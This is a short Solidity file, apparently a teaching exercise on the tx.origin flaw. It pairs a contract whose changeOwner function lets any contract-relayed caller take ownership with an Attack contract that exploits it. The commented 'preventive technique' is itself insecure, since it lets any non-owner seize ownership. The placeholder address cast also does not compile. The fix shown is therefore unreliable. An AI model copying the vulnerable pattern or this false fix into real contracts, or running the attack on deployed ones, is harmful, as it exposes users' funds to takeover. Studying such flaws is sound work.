// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract BaseContract {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
// never use tx.origin !!! prefer using msg.sender !

// Preventive technique
// function changeOwner(address _owner) public {
//   require(msg.sender != owner, "You are already the owner");
//   owner = _owner;
// }

contract Attack {
  address payable public owner;
  BaseContract _baseContractInstance;

  constructor() {
    _baseContractInstance = BaseContract("DEPLOYED_ADDRESS");
    owner = payable(msg.sender);
  }

  function attack() public {
    _baseContractInstance.changeOwner(owner);
  }
}